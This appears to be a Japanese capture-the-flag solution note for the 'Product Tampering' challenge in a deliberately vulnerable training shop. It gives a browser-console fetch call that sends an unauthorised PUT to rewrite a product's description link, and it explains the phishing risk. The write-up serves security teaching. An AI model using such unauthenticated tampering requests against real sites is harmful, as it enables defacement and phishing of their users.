# Product Tampering ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** アクセス制御
**目標:** 商品説明のリンク先を改ざんする

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
fetch('/api/Products/9', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    description: 'O-Saft is an easy to use tool... <a href="https://owasp.slack.com" target="_blank">More...</a>'
  })
})
```

## 解説

- O-Saft商品（ID: 9）のリンク先をowasp.slack.comに変更
- PUT APIが認証なしで、または不十分な権限チェックで受け入れられる
- 商品情報を改ざんしてフィッシングサイトに誘導可能

**なぜ危険？**
- ユーザーが信頼するサイト上のリンクをクリック
- 悪意あるサイトに誘導される
- サプライチェーン攻撃の一種

## 関連チャレンジ

- [Admin Registration](admin-registration.md)
- [View Basket](../difficulty-2/view-basket.md)
